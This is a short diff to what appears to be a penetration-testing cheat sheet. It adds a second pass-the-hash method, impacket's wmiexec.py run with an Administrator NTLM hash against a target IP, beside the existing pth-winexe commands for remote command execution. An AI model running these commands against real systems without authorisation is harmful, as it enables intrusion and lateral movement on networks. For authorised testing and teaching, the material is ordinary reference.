@@ -200,8 +200,13 @@ Pass-the-Hash
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
 ```
+# Method 1
 $ pth-winexe -U [username]%[password_hash] //[target] [command_to_exec]
 $ pth-winexe -U Administrator%NTLMhash //10.1.1.1 cmd
+
+# Method 2
+$ python wmiexec.py Administrator@[target] -hashes [LM]:[NT/NTLM]
+$ python wmiexec.py Administrator@10.11.1.22 -hashes [leavebankifnoLM]:ee12345067801f38115019ca2fb
 ```
 
 Overpass-the-Hash
